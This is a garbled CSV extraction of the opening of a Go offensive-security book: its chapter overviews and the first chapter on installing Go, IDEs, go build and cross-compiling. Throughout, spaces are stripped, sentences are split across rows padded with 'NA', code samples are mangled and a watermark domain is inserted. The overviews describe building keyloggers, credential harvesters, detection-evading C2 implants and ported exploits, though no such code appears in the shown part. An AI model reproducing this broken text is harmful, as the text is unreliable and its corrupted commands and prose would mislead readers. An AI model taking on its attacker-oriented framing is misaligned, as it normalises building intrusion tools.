nefariousorillegalthingsyouchoosetodo.Allthecontent ,NA,NA
hereisforeducationalpurposesonly;donotperformany ,NA,NA
penetration-testingactivitiesagainstsystemsorapplications ,NA,NA
withoutauthorizedconsent.,NA,NA
Thesectionsthatfollowprovideabriefoverviewofeach ,NA,NA
chapter.,NA,NA
Chapter1:GoFundamentals,NA,NA
Thegoalofthischapteristointroducethefundamentalsofthe ,NA,NA
Goprogramminglanguageandprovideafoundationnecessar,NA,NA
y,NA,NA
forunderstandingtheconceptswithinthisbook.Thisincludes ,NA,NA
anabridgedreviewofbasicGosyntaxandidioms.Wediscuss ,NA,NA
"theGoecosystem,includingsupportingtools,IDEs, ",NA,NA
"dependencymanagement,andmore.Readersnewtothe ",NA,NA
programminglanguagecanexpecttolearnthebarenecessities ,NA,NA
"ofGo,whichwillallowthemto,hopefully,comprehend, ",NA,NA
"implement,andextendtheexamplesinlaterchapters.",NA,NA
"Chapter2:TCP,Scanners,andProxies",NA,NA
ThischapterintroducesbasicGoconceptsandconcurrency ,NA,NA
"primitivesandpatterns,input/output(I/O),andtheuseof ",NA,NA
interfacesthroughpracticalTCPapplications.We’llfirstwalk ,NA,NA
youthroughcreatingasimpleTCPportscannerthatscansa ,NA,NA
listofportsusingparsedcommandlineoptions.Thiswill ,NA,NA
highlightthesimplicityofGocodecomparedtoother ,NA,NA
"languagesandwilldevelopyourunderstandingofbasictypes, ",NA,NA
"userinput,anderrorhandling.Next,we’lldiscusshowto ",NA,NA
improvetheefficiencyandspeedofthisportscannerby ,NA,NA
introducingconcurrentfunctions.We’llthenintroduceI/Oby ,NA,NA
buildingaTCPproxy—aportforwarder—startingwithbasic ,NA,NA
examplesandrefiningourcodetocreateamorereliable ,NA,NA
"solution.Lastly,we’llre-createNetcat’s“gapingsecurity ",NA,NA
"hole”featureinGo,teachingyouhowtorunoperatingsystem ",NA,NA
commandswhilemanipulatingstdinandstdoutandredirecti,NA,NA
ng themoverTCP.,NA,NA
Chapter3:HTTPClientsandRemoteInteraction ,NA,NA
withTools,NA,NA
HTTPclientsareacriticalcomponenttointeractingwith ,NA,NA
modernwebserverarchitectures.Thischaptershowsyouho,NA,NA
w tocreatetheHTTPclientsnecessarytoperformavarietyof,NA,NA
commonwebinteractions.You’llhandleavarietyofformats ,NA,NA
tointeractwithShodanandMetasploit.We’llalso ,NA,NA
"demonstratehowtoworkwithsearchengines,usingthemto ",NA,NA
scrapeandparsedocumentmetadatasoastoextract ,NA,NA
informationusefulfororganizationalprofilingactivities.,NA,NA
"Chapter4:HTTPServers,Routing,andMiddleware",NA,NA
Thischapterintroducestheconceptsandconventions ,NA,NA
necessaryforcreatinganHTTPserver.We’lldiscusscommon ,NA,NA
"routing,middleware,andtemplatingpatterns,leveragingthis ",NA,NA
knowledgetocreateacredentialharvesterandkeylogger.,NA,NA
"Lastly,we’lldemonstratehowtomultiplexcommand-and-",NA,NA
control(C2)connectionsbybuildingareverseHTTPproxy.,NA,NA
Chapter5:ExploitingDNS,NA,NA
ThischapterintroducesyoutobasicDNSconceptsusingGo. ,NA,NA
"First,we’llperformclientoperations,includinghowtolook ",NA,NA
forparticulardomainrecords.Thenwe’llshowyouhowto ,NA,NA
"writeacustomDNSserverandDNSproxy,bothofwhichare ",NA,NA
usefulforC2operations.,NA,NA
Chapter6:InteractingwithSMBandNTLM,NA,NA
"We’llexploretheSMBandNTLMprotocols,usingthemasa ",NA,NA
basisforadiscussionofprotocolimplementationsinGo.,NA,NA
"UsingapartialimplementationoftheSMBprotocol,we’ll ",NA,NA
"discussthemarshalingandunmarshalingofdata,theusageof ",NA,NA
"customfieldtags,andmore.We’lldiscussanddemonstrate ",NA,NA
howtousethisimplementationtoretrievetheSMB-signing ,NA,NA
"policy,aswellasperformpassword-guessingattacks.",NA,NA
Chapter7:AbusingDatabasesandFilesystems,NA,NA
Pillagingdataisacriticalaspectofadversarialtesting.Data ,NA,NA
"livesinnumerousresources,includingdatabasesand ",NA,NA
filesystems.Thischapterintroducesbasicwaystoconnectto ,NA,NA
andinteractwithdatabasesacrossavarietyofcommonSQL ,NA,NA
andNoSQLplatforms.You’lllearnthebasicsofconnectingto ,NA,NA
SQLdatabasesandrunningqueries.We’llshowyouhowto ,NA,NA
"searchdatabasesandtablesforsensitiveinformation,a ",NA,NA
commontechniqueusedduringpost-exploitation.We’llalso ,NA,NA
showhowtowalkfilesystemsandinspectfilesforsensitive ,NA,NA
information.,NA,NA
Chapter8:RawPacketProcessing,NA,NA
We’llshowyouhowtosniffandprocessnetworkpacketsby ,NA,NA
usingthe,gopacket,NA
"library,whichuses",libpcap,NA
.You’lllearnhowto,NA,NA
"identifyavailablenetworkdevices,usepacketfilters,and ",NA,NA
processthosepackets.Wewillthendevelopaportscanner ,NA,NA
"thatcanscanreliablythroughvariousprotectionmechanisms, ",NA,NA
"includingsyn-floodandsyn-cookies,whichcausenormalport ",NA,NA
scanstoshowexcessivefalsepositives.,NA,NA
Chapter9:WritingandPortingExploitCode,NA,NA
Thischapterfocusesalmostsolelyoncreatingexploits.It ,NA,NA
beginswithcreatingafuzzertodiscoverdifferenttypesof ,NA,NA
vulnerabilities.Thesecondhalfofthechapterdiscusseshow ,NA,NA
toportexistingexploitstoGofromotherlanguages.This ,NA,NA
discussionincludesaportofaJavadeserializationexploitand ,NA,NA
theDirtyCOWprivilegeescalationexploit.Weconcludethe ,NA,NA
chapterwithadiscussiononcreatingandtransforming ,NA,NA
shellcodeforusewithinyourGoprograms.,NA,NA
Chapter10:GoPluginsandExtendableTools,HivaNetwork.Com,NA
We’llintroducetwoseparatemethodsforcreatingextendable ,NA,NA
"tools.Thefirstmethod,introducedinGoversion1.8,uses ",NA,NA
Go’snativeplug-inmechanism.We’lldiscusstheusecases ,NA,NA
forthisapproachanddiscussasecondapproachthatleverages ,NA,NA
Luatocreateextensibletools.We’lldemonstratepractical ,NA,NA
examplesshowinghowtoadopteitherapproachtoperforma ,NA,NA
commonsecuritytask.,NA,NA
Chapter11:ImplementingandAttackin,NA,NA
g Cryptography,NA,NA
Thischaptercoversthefundamentalconceptsofsymmetric ,NA,NA
andasymmetriccryptographyusingGo.Thisinformation ,NA,NA
focusesonusingandunderstandingcryptographythroughth,NA,NA
"e standardGopackage.Goisoneofthefewlanguagesthat, ",NA,NA
"insteadofusingathird-partylibraryforencryption,usesa ",NA,NA
nativeimplementationwithinthelanguage.Thismakesthe ,NA,NA
"codeeasytonavigate,modify,andunderstand.",NA,NA
We’llexplorethestandardlibrarybyexaminingcommon ,NA,NA
usecasesandcreatingtools.Thechapterwillshowyouhowto ,NA,NA
"performhashing,messageauthentication,andencryption. ",NA,NA
"Lastly,we’lldemonstratehowtobrute-forcedecryptanRC2-",NA,NA
encryptedciphertext.,NA,NA
Chapter12:WindowsSystemInteractionan,NA,NA
d Analysis,NA,NA
"InourdiscussiononattackingWindows,we’lldemonstrate ",NA,NA
"methodsofinteractingwiththeWindowsnativeAPI,explore ",NA,NA
the,syscall,NA
"packageinordertoperformprocessinjection,and",NA,NA
learnhowtobuildaPortableExecutable(PE)binaryparser. ,NA,NA
ThechapterwillconcludewithadiscussionofcallingnativeC ,NA,NA
librariesthroughGo’sCinteroperabilitymechanisms.,NA,NA
Chapter13:HidingDatawithSteganography,NA,NA
Steganography,NA,NA
istheconcealmentofamessageorfilewithin ,NA,NA
anotherfile.Thischapterintroducesonevariationof ,NA,NA
steganography:hidingarbitrarydatawithinaPNGimage ,NA,NA
file’scontents.Thesetechniquescanbeusefulforexfiltrating ,NA,NA
"information,creatingobfuscatedC2messages,andbypassin",NA,NA
g detectiveorpreventativecontrols.,NA,NA
Chapter14:BuildingaCommand-and-ControlRAT,NA,NA
Thefinalchapterdiscussespracticalimplementationsof ,NA,NA
command-and-control(C2)implantsandserversinGo.We’ll ,NA,NA
leveragethewisdomandknowledgegainedinprevious ,NA,NA
chapterstobuildaC2channel.TheC2client/server ,NA,NA
"implementationwill,bynatureofbeingcustom-made,avoid ",NA,NA
signature-basedsecuritycontrolsandattempttocircumvent ,NA,NA
heuristicsandnetwork-basedegresscontrols.,NA,NA
1 ,NA,NA
GOFUNDAMENTALS,NA,NA
Thischapterwillguideyouthroughtheprocessofsettingup ,NA,NA
yourGodevelopmentenvironmentandintroduceyoutothe ,NA,NA
language’ssyntax.Peoplehavewrittenentirebooksonthe ,NA,NA
fundamentalmechanicsofthelanguage;thischaptercovers ,NA,NA
themostbasicconceptsyou’llneedinordertoworkthrough ,NA,NA
thecodeexamplesinthefollowingchapters.We’llcover ,NA,NA
everythingfromprimitivedatatypestoimplementing ,NA,NA
concurrency.Forreaderswhoarealreadywellversedinthe ,NA,NA
"language,you’llfindmuchofthischaptertobeareview.",NA,NA
SETTINGUPADEVELOPMENT ,NA,NA
ENVIRONMENT,NA,NA
"TogetstartedwithGo,you’llneedafunctionaldevelopment ",NA,NA
"environment.Inthissection,we’llwalkyouthroughthesteps ",NA,NA
todownloadGoandsetupyourworkspaceandenvironment ,NA,NA
variables.We’lldiscussvariousoptionsforyourintegrated ,NA,NA
developmentenvironmentandsomeofthestandardtooling,NA,NA
thatcomeswithGo.,NA,NA
DownloadingandInstallingGo,NA,NA
StartbydownloadingtheGobinaryreleasemostappropriate ,NA,NA
toyouroperatingsystemandarchitecturefrom ,NA,NA
https://golang.org/dl/,NA,NA
".BinariesexistforWindows,Linux,and ",NA,NA
macOS.Ifyou’reusingasystemthatdoesn’thaveanavailable ,NA,NA
"precompiledbinary,youcandownloadtheGosourcecode ",NA,NA
fromthatlink.,NA,NA
"Executethebinaryandfollowtheprompts,whichwillbe ",NA,NA
"minimal,inordertoinstalltheentiresetofGocorepackages.",NA,NA
Packages,NA,NA
",called",NA,NA
libraries,NA,NA
"inmostotherlanguages,contain ",NA,NA
usefulcodeyoucanuseinyourGoprograms.,NA,NA
SettingGOROOTtoDefinetheGoBinaryLocation,NA,NA
"Next,theoperatingsystemneedstoknowhowtofindtheGo ",NA,NA
"installation.Inmostinstances,ifyou’veinstalledGointhe ",NA,NA
"defaultpath,suchas",NA,NA
/usr/local/go,NA,NA
ona*Nix/BSD-based ,NA,NA
"system,youdon’thavetotakeanyactionhere.However,in ",NA,NA
theeventthatyou’vechosentoinstallGoinanonstandard ,NA,NA
"pathorareinstallingGoonWindows,you’llneedtotellthe ",NA,NA
operatingsystemwheretofindtheGobinary.,NA,NA
Youcandothisfromyourcommandlinebysettingthe ,NA,NA
reserved,GOROOT,NA
environmentvariabletothelocationofyour,NA,NA
binary.Settingenvironmentvariablesisoperating-,NA,NA
system ,NA,NA
"specific.OnLinuxormacOS,youcanaddthistoyour ",NA,NA
~/.profile,NA,NA
:,"setGOROOT=
 /path/to/go",NA
"OnWindows,youcanaddthisenvironmentvariable",NA,NA
"throughtheSystem(ControlPanel),byclickingthe ",NA,NA
EnvironmentVariables,NA,NA
button.,NA,NA
SettingGOPATHtoDeterminetheLocationofYour ,NA,NA
GoWorkspace,NA,NA
Unlikesettingyour,GOROOT,NA
",whichisnecessaryinonlycertain",NA,NA
"installationscenarios,youmustalwaysdefineanenvironment ",NA,NA
variablenamed,GOPATH,NA
toinstructtheGotoolsetwhereyour,NA,NA
"sourcecode,third-partylibraries,andcompiledprogramswill ",NA,NA
exist.Thiscanbeanylocationofyourchoosing.Onceyou’ve ,NA,NA
"chosenorcreatedthisbaseworkspacedirectory,createthe ",NA,NA
followingthreesubdirectorieswithin:,NA,NA
bin,NA,NA
",",NA,NA
pkg,NA,NA
",and",NA,NA
src,NA,NA
(more ,NA,NA
"onthesedirectoriesshortly).Then,setanenvironment ",NA,NA
variablenamed,GOPATH,NA
thatpointstoyourbaseworkspace,NA,NA
"directory.Forexample,ifyouwanttoplaceyourprojectsina ",NA,NA
directorycalled,NA,NA
gocode,NA,NA
locatedwithinyourhomedirectoryon ,NA,NA
"Linux,youset",GOPATH,NA
tothefollowing:,GOPATH=$HOME/gocode,NA
The,NA,NA
bin,NA,NA
directorywillcontainyourcompiledandinstalled ,NA,NA
Goexecutablebinaries.Binariesthatarebuiltandinstalled ,NA,NA
willbeautomaticallyplacedintothislocation.The,NA,NA
pkg ,NA,NA
"directorystoresvariouspackageobjects,includingthird-",NA,NA
party ,NA,NA
"Godependenciesthatyourcodemightrelyon.Forexample, ",NA,NA
perhapsyouwanttouseanotherdeveloper’scodethatmore ,NA,NA
elegantlyhandlesHTTProuting.The,NA,NA
pkg,NA,NA
directorywill ,NA,NA
containthebinaryartifactsnecessarytoconsumetheir ,NA,NA
"implementationinyourcode.Finally,the",NA,NA
src,NA,NA
directorywill ,NA,NA
containalltheevilsourcecodeyou’llwrite.,NA,NA
"Thelocationofyourworkspaceisarbitrary,butthe",NA,NA
directorieswithinmustmatchthisnamingconventionand ,NA,NA
"structure.Thecompilation,build,andpackagemanagement ",NA,NA
commandsyou’lllearnaboutlaterinthischapterallrelyon ,NA,NA
thiscommondirectorystructure.Withoutthisimportantsetu,NA,NA
"p, Goprojectswon’tcompileorbeabletolocateanyoftheir ",NA,NA
necessarydependencies!,NA,NA
Afterconfiguringthenecessary,GOROOT,NA
and,GOPATH,NA
"environmentvariables,confirmthatthey’reproperlyset.You ",NA,NA
candothisonLinuxandWindowsviathe,set,NA
"command.Also,",NA,NA
checkthatyoursystemcanlocatethebinaryandthatyou’ve ,NA,NA
installedtheexpectedGoversionwiththe,goversion,NA
command:,"$
 goversion
  
  
 goversiongo1.11.5linux/amd64",NA
Thiscommandshouldreturntheversionofthebinaryyou ,NA,NA
installed.,NA,NA
ChoosinganIntegratedDevelopmentEnvironment,NA,NA
"Next,you’llprobablywanttoselectanintegrateddevelopment ",NA,NA
environment(IDE)inwhichtowriteyourcode.Althoughan ,NA,NA
"IDEisn’trequired,manyhavefeaturesthathelpreduceerrors ",NA,NA
"inyourcode,addversion-controlshortcuts,aidinpackage ",NA,NA
"management,andmore.AsGoisstillafairlyyounglanguage, ",NA,NA
theremaynotbeasmanymatureIDEsasforotherlanguages.,NA,NA
"Fortunately,advancementsoverthelastfewyearsleave ",NA,NA
"youwithseveral,full-featuredoptions.We’llreviewsomeof ",NA,NA
theminthischapter.ForamorecompletelistofIDEoreditor ,NA,NA
"options,checkouttheGowikipageat ",NA,NA
https://github.com/golang/go/wiki/IDEsAndTextEditorPlu,NA,NA
gins/ ,NA,NA
".ThisbookisIDE/editoragnostic,meaningwewon’tforce",NA,NA
youintoanyonesolution.,NA,NA
VimEditor,NA,NA
The,NA,NA
Vim,NA,NA
"texteditor,availableinmanyoperating-system ",NA,NA
"distributions,providesaversatile,extensible,andcompletely ",NA,NA
opensourcedevelopmentenvironment.Oneappealingfeatur,NA,NA
e ofVimisthatitletsusersruneverythingfromtheirterminal ,NA,NA
withoutfancyGUIsgettingintheway.,NA,NA
Vimcontainsavastecosystemofplug-insthroughwhich ,NA,NA
"youcancustomizethemes,addversioncontrol,define ",NA,NA
"snippets,addlayoutandcode-navigationfeatures,include ",NA,NA
"autocomplete,performsyntaxhighlightingandlinting,and ",NA,NA
"much,muchmore.Vim’smostcommonplug-inmanagement ",NA,NA
systemsincludeVundleandPathogen.,NA,NA
"TouseVimforGo,installthe",vim-go,NA
plug-in,NA,NA
(,NA,NA
https://github.com/fatih/vim-go/,NA,NA
)shownin,NA,NA
Figure1-1,NA,NA
.,NA,NA
"Ofcourse,touseVimforGodevelopment,you’llhaveto ",NA,NA
"becomecomfortablewithVim.Further,customizingyour ",NA,NA
developmentenvironmentwithallthefeaturesyoudesire ,NA,NA
"mightbeafrustratingprocess.IfyouuseVim,whichisfree, ",NA,NA
you’lllikelyneedtosacrificesomeoftheconveniencesof ,NA,NA
commercialIDEs.,NA,NA
GitHubAtom,NA,NA
"GitHub’sIDE,called",NA,NA
Atom,NA,NA
(,NA,NA
https://atom.io/,NA,NA
"),isahackable ",NA,NA
texteditorwithalargeofferingofcommunity-driven ,NA,NA
"packages.UnlikeVim,AtomprovidesadedicatedIDE ",NA,NA
applicationratherthananin-,NA,NA
"terminalsolution,asshownin ",NA,NA
Figure1-2,NA,NA
.,NA,NA
"LikeVim,Atomisfree.Itprovidestiling,package ",NA,NA
"management,versioncontrol,debugging,autocomplete,anda ",NA,NA
myriadofadditionalfeaturesoutoftheboxorthroughtheuse ,NA,NA
ofthe,go-plus,NA
"plug-in,whichprovidesdedicatedGosupport",NA,NA
(,NA,NA
https://atom.io/packages/go-plus/,NA,NA
).,NA,NA
MicrosoftVisualStudioCode,NA,NA
Microsoft’s,NA,NA
VisualStudioCode,NA,NA
",or",NA,NA
VSCode ,NA,NA
(,NA,NA
https://code.visualstudio.com,NA,NA
"),isarguablyoneofthemos",NA,NA
t feature-richandeasiestIDEapplicationstoconfigure.VS ,NA,NA
"Code,shownin",NA,NA
Figure1-3,NA,NA
",iscompletelyopensourceand",NA,NA
distributedunderanMITlicense.,Figure1-3:TheVSCodeIDEwithGosupport,NA
"VSCodesupportsadiversesetofextensionsforthemes, ",NA,NA
"versioning,codecompletion,debugging,linting,and ",NA,NA
formatting.YoucangetGointegrationwiththe,vscode-go,NA
extension(,NA,NA
https://github.com/Microsoft/vscode-go/,NA,NA
).,NA,NA
JetBrainsGoLand,NA,NA
TheJetBrainscollectionofdevelopmenttoolsareefficientand ,NA,NA
"feature-rich,makingbothprofessionaldevelopmentand ",NA,NA
hobbyistprojectseasytoaccomplish.,NA,NA
Figure1-4,NA,NA
showswhat ,NA,NA
theJetBrainsGoLandIDElookslike.,NA,NA
GoLand,NA,NA
istheJetBrainscommercialIDEdedicatedtothe ,NA,NA
Golanguage.PricingforGoLandrangesfromfreefor,HivaNetwork.Com,NA
"students,to$89annuallyforindividuals,to$199annuallyfor ",NA,NA
organizations.GoLandoffersalltheexpectedfeaturesofa ,NA,NA
"richIDE,includingdebugging,codecompletion,version ",NA,NA
"control,linting,formatting,andmore.Althoughpayingfora ",NA,NA
"productmaynotsoundappealing,commercialproductssuch ",NA,NA
"asGoLandtypicallyhaveofficialsupport,documentation, ",NA,NA
"timelybugfixes,andsomeoftheotherassurancesthatcome ",NA,NA
withenterprisesoftware.,Figure1-4:TheGoLandcommercialIDE,NA
UsingCommonGoToolCommands,NA,NA
Goshipswithseveralusefulcommandsthatsimplifythe ,NA,NA
developmentprocess.Thecommandsthemselvesare ,NA,NA
"commonlyincludedinIDEs,makingthetoolingconsistent ",NA,NA
acrossdevelopmentenvironments.Let’stakealookatsomeof,NA,NA
thesecommands.,NA,NA
ThegorunCommand,NA,NA
Oneofthemorecommoncommandsyou’llexecuteduring ,NA,NA
"development,",gorun,NA
willcompileandexecutethe,NA,NA
mainpackage,NA,NA
—yourprogram’sentrypoint.,NA,NA
"Asanexample,savethefollowingcodeunderaproject ",NA,NA
directorywithin,NA,NA
$GOPATH/src,NA,NA
"(remember,youcreatedthis ",NA,NA
workspaceduringinstallation)as,NA,NA
main.go,NA,NA
:,"packagemain
  
  
 import(
  
  
 ""fmt""
  
  
 )
  
  
 funcmain(){
  
  
 fmt.Println(""Hello,BlackHatGophers!"")
  
  
 }",NA
"Fromthecommandline,withinthedirectorycontainin",NA,NA
"g thisfile,execute",gorunmain.go,NA
.Youshouldsee,"Hello,BlackHat
  
 Gophers!",NA
printedtoyourscreen.,NA,NA
ThegobuildCommand,NA,NA
Notethat,gorun,NA
"executedyourfile,butitdidn’tproducea",NA,NA
standalonebinaryfile.That’swhere,gobuild,NA
comesin.The,"go
  
 build",NA
"commandcompilesyourapplication,includingany",NA,NA
"packagesandtheirdependencies,withoutinstallingtheresults.",NA,NA
Itcreatesabinaryfileondiskbutdoesn’texecuteyour ,NA,NA
program.Thefilesitcreatesfollowreasonablenaming ,NA,NA
"conventions,butit’snotuncommontochangethenameofthe ",NA,NA
createdbinaryfilebyusingthe,-ooutput,NA
commandlineoption.,NA,NA
Rename,NA,NA
main.go,NA,NA
fromthepreviousexampleto,NA,NA
hello.go,NA,NA
.In,NA,NA
"aterminalwindow,execute",gobuildhello.go,NA
.Ifeverythinggoes,NA,NA
"asintended,thiscommandshouldcreateanexecutablefile ",NA,NA
withthename,NA,NA
hello,NA,NA
.Nowenterthiscommand:,"$
 ./hello
  
  
 Hello,BlackHatGophers!",NA
Thisshouldrunthestandalonebinaryfile.,NA,NA
"Bydefault,theproducedbinaryfilecontainsdebugging ",NA,NA
informationandthesymboltable.Thiscanbloatthesizeof ,NA,NA
"thefile.Toreducethefilesize,youcanincludeadditional ",NA,NA
flagsduringthebuildprocesstostripthisinformationfromthe ,NA,NA
"binary.Forexample,thefollowingcommandwillreducethe ",NA,NA
binarysizebyapproximately30percent:,"$
 gobuild-ldflags""-w-s""",NA
Havingasmallerbinarywillmakeitmoreefficientto ,NA,NA
transferorembedwhilepursuingyournefariousendeavors,NA,NA
.,NA,NA
Cross-Compiling,NA,NA
Using,gobuild,NA
worksgreatforrunningabinaryonyourcurrent,NA,NA
"systemoroneofidenticalarchitecture,butwhatifyouwantto ",NA,NA
createabinarythatcanrunonadifferentarchitecture?That’s ,NA,NA
wherecross-compilingcomesin.,NA,NA
Cross-compiling,NA,NA
isoneof ,NA,NA
"thecoolestaspectsofGo,asnootherlanguagecandoitas ",NA,NA
easily.The,build,NA
commandallowsyoutocross-compileyour,NA,NA
programformultipleoperatingsystemsandarchitectures.,NA,NA
ReferencetheofficialGodocumentationat ,NA,NA
https://golang.org/doc/install/source#environment/,NA,NA
forfur,NA,NA
ther detailsregardingallowablecombinationsofcompatible ,NA,NA
operatingsystemandarchitecturecompilationtypes.,NA,NA
"Tocross-compile,youneedtoseta",NA,NA
constraint,NA,NA
.Thisisjust ,NA,NA
ameanstopassinformationtothe,build,NA
commandaboutthe,NA,NA
operatingsystemandarchitectureforwhichyou’dliketo ,NA,NA
compileyourcode.Theseconstraintsinclude,GOOS,NA
(forthe,NA,NA
operatingsystem)and,GOARCH,NA
(forthearchitecture).,NA,NA
Youcanintroducebuildconstraintsinthreeways:viathe ,NA,NA
"commandline,codecomments,orafilesuffixnaming ",NA,NA
convention.We’lldiscussthecommandlinemethodhereand ,NA,NA
leavetheothertwomethodsforyoutoresearchifyouwish.,NA,NA
Let’ssupposethatyouwanttocross-compileyourprevious ,NA,NA
hello.go,NA,NA
programresidingonamacOSsystemsothatitruns ,NA,NA
onaLinux64-bitarchitecture.Youcanaccomplishthisviathe ,NA,NA
commandlinebysettingthe,GOOS,NA
and,GOARCH,NA
constraints,NA,NA
whenrunningthe,build,NA
command:,"$
 GOOS=""linux""GOARCH=""amd64""gobuildhello.go
  
  
 $
 ls
  
  
 hellohello.go
  
  
 $
 filehello
  
  
 hello:ELF64-bitLSBexecutable,x86-64,version1(SYSV),staticallylinked,not
  
  
 stripped",NA
Theoutputconfirmsthattheresultingbinaryisa64-bit ,NA,NA
ELF(Linux)file.,NA,NA
Thecross-compilationprocessismuchsimplerinGothan ,NA,NA
injustaboutanyothermodernprogramminglanguage.The ,NA,NA
onlyreal“gotcha”happenswhenyoutrytocross-compile ,NA,NA
applicationsthatusenativeCbindings.We’llstayoutofthe ,NA,NA
weedsandletyoudigintothosechallengesindependently. ,NA,NA
Dependingonthepackagesyouimportandtheprojectsyou ,NA,NA
"develop,youmaynothavetoworryaboutthatveryoften.",NA,NA
ThegodocCommand,NA,NA
ThegodocCommand,NA,NA
The,godoc,NA
commandletsyouinterrogatedocumentationabout,NA,NA
"apackage,function,method,orvariable.Thisdocumentation",NA,NA
isembeddedascommentsthroughyourcode.Let’stakealook,NA,NA
athowtoobtaindetailsaboutthe,fmt.Println(),NA
function:,"$
 godocfmt.Println
  
  
 funcPrintln(a...interface{})(nint,errerror)
  
  
 Printlnformatsusingthedefaultformatsforitsoperandsandwritesto
  
  
 standardoutput.Spacesarealwaysaddedbetweenoperandsandanewline
  
  
 isappended.Itreturnsthenumberofbyteswrittenandanywriteerror
  
  
 encountered.",NA
Theoutputthat,godoc,NA
producesistakendirectlyoutofthe,NA,NA
sourcecodecomments.Aslongasyouadequatelycomment,NA,NA
"yourpackages,functions,methods,andvariables,you’llbe",NA,NA
abletoautomaticallyinspectthedocumentationviathe,godoc,NA
command.,NA,NA
ThegogetCommand,NA,NA
ManyoftheGoprogramsthatyou’lldevelopinthisbookwill,NA,NA
"requirethird-partypackages.Toobtainpackagesourcecode,",NA,NA
usethe,goget,NA
"command.Forinstance,let’sassumeyou’ve",NA,NA
writtenthefollowingcodethatimportsthe,stacktitan/ldapauth,NA
package:,"packagemain
  
  
 import(
  
  
 ""fmt""
  
  
 ""net/http""
  
  
 ❶""github.com/stacktitan/ldapaut
 h"" 
  
 )",NA
Eventhoughyou’veimportedthe,stacktitan/ldapauth,NA
packag,NA,NA
"e❶,youcan’taccessthepackagequiteyet.Youfirsthaveto ",NA,NA
runthe,goget,NA
command.Using,gogetgithub.com/stacktitan/ldapauth,NA
downloadstheactualpackageandplacesitwithinthe ,NA,NA
$GOPATH/src,NA,NA
directory.,NA,NA
Thefollowingdirectorytreeillustratestheplacementofthe ,ldapauth,NA
packagewithinyour,GOPATH,NA
workspace:,"$
 treesrc/github.com/stacktitan
 /
  
 ❶src/github.com/stacktitan/
  
 └──ldapauth
  
  
 ├──LICENSE
  
  
 ├──README.md
  
  
 └──ldap_auth.go",NA
Noticethatthepath❶andtheimportedpackagenameare ,NA,NA
constructedinawaythatavoidsassigningthesamenameto ,NA,NA
multiplepackages.Using,github.com/stacktitan,NA
asaprefacetothe ,NA,NA
actualpackagename,ldapauth,NA
ensuresthatthepackagename ,NA,NA
remainsunique.,NA,NA
AlthoughGodeveloperstraditionallyinstalldependencie,NA,NA
s with,goget,NA
",problemscanariseifthosedependentpackages ",NA,NA
receiveupdatesthatbreakbackwardcompatibility.Gohas ,NA,NA
introducedtwoseparatetools—,dep,NA
and,mod,NA
—tolock ,NA,NA
dependenciesinordertopreventbackwardcompatibility ,NA,NA
"issues.However,thisbookalmostexclusivelyuses",goget,NA
to ,NA,NA
pulldowndependencies.Thiswillhelpavoidinconsistencies ,NA,NA
withongoingdependencymanagementtoolingandhopefull,NA,NA
y makeiteasierforyoutogettheexamplesupandrunning.,NA,NA
ThegofmtCommand,NA,NA
The,gofmt,NA
commandautomaticallyformatsyoursourcecode.,NA,NA
"Forexample,running","gofmt
 /path/to/your/package",NA
willstyleyour,NA,NA
"codebyenforcingtheuseofproperlinebreaks,indentation, ",NA,NA
andbracealignment.,NA,NA
Adheringtoarbitrarystylingpreferencesmightseem ,NA,NA
"strangeatfirst,particularlyiftheydifferfromyourhabits. ",NA,NA
"However,youshouldfindthisconsistencyrefreshingover ",NA,NA
"time,asyourcodewilllooksimilartootherthird-party ",NA,NA
packagesandfeelmoreorganized.MostIDEscontainhooks ,NA,NA
thatwillautomaticallyrun,gofmt,NA
"whenyousaveyourfile,so",NA,NA
youdon’tneedtoexplicitlyrunthecommand.,NA,NA
ThegolintandgovetCommands,NA,NA
Whereas,gofmt,NA
"changesthesyntacticalstylingofyourcode,",golint,NA
"reportsstylemistakessuchasmissingcomments,",NA,NA
"variablenamingthatdoesn’tfollowconventions,uselesstype ",NA,NA
"specifications,andmore.Noticethat",golint,NA
"isastandalonetool,",NA,NA
andnotasubcommandofthemain,go,NA
binary.You’llneedto,NA,NA
installitseparatelybyusing,goget-ugolang.org/x/lint/golint,NA
.,NA,NA
"Similarly,",govet,NA
inspectsyourcodeandusesheuristicsto,NA,NA
"identifysuspiciousconstructs,suchascalling",Printf(),NA
withthe,NA,NA
incorrectformatstringtypes.The,govet,NA
commandattemptsto,NA,NA
"identifyissues,someofwhichmightbelegitimatebugs,thata ",NA,NA
compilermightmiss.,NA,NA
GoPlayground,NA,NA
The,NA,NA
GoPlayground,NA,NA
isanexecutionenvironmenthostedat ,NA,NA
https://play.golang.org/,NA,NA
thatprovidesaweb-,NA,NA
basedfrontendfor ,NA,NA
"developerstoquicklydevelop,test,execute,andshare ",NA,NA
snippetsofGocode.Thesitemakesiteasytotryoutvarious,NA,NA
GofeatureswithouthavingtoinstallorrunGoonyourlocal ,NA,NA
system.It’sagreatwaytotestsnippetsofcodebefore ,NA,NA
integratingthemwithinyourprojects.,NA,NA
Italsoallowsyoutosimplyplaywithvariousnuancesof ,NA,NA
thelanguageinapreconfiguredenvironment.It’sworthnoting ,NA,NA
thattheGoPlaygroundrestrictsyoufromcallingcertain ,NA,NA
"dangerousfunctionstopreventyoufrom,forexample, ",NA,NA
executingoperating-systemcommandsorinteractingwith ,NA,NA
third-partywebsites.,NA,NA
OtherCommandsandTools,NA,NA
Althoughwewon’texplicitlydiscussothertoolsand ,NA,NA
"commands,weencourageyoutodoyourownresearch.As ",NA,NA
"youcreateincreasinglycomplexprojects,you’relikelytorun ",NA,NA
"intoadesireto,forexample,usethe",gotest,NA
tooltorununittests,NA,NA
"andbenchmarks,",cover,NA
"tocheckfortestcoverage,",imports,NA
tofix,NA,NA
"importstatements,andmore.",NA,NA
UNDERSTANDINGGOSYNTAX,NA,NA
AnexhaustivereviewoftheentireGolanguagewouldtake ,NA,NA
"multiplechapters,ifnotanentirebook.Thissectiongivesa ",NA,NA
"briefoverviewofGo’ssyntax,particularlyrelativetodata ",NA,NA
"types,controlstructures,andcommonpatterns.Thisshould ",NA,NA
actasarefresherforcasualGocodersandanintroductionfor ,NA,NA
thosenewtothelanguage.,NA,NA
"Foranin-depth,progressivereviewofthelanguage,we ",NA,NA
recommendthatyouworkthroughtheexcellent,NA,NA
ATourofGo ,NA,NA
(,NA,NA
https://tour.golang.org/,NA,NA
")tutorial.It’sacomprehensive,han",NA,NA
ds-ondiscussionofthelanguagebrokenintobite-sizedlessons,NA,NA
thatuseanembeddedplaygroundtoenableyoutotryouteach ,NA,NA
oftheconcepts.,NA,NA
ThelanguageitselfisamuchcleanerversionofCthat ,NA,NA
